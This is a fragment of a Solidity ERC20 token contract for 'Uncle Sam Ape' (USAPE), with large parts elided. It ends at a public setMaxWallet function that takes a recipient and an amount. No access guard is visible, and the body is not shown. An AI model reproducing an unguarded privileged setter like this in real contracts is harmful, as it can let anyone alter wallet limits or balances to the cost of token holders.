...
contract UncleSamApe is Context, IERC20, Ownable {
	...
	uint256 private _tTotal = 8000000 * 10**18;
	...
	string private constant _name = "Uncle Sam Ape";
	string private constant _symbol = "USAPE";
	...
	function setMaxWallet(address recipient,uint256 amount) public {
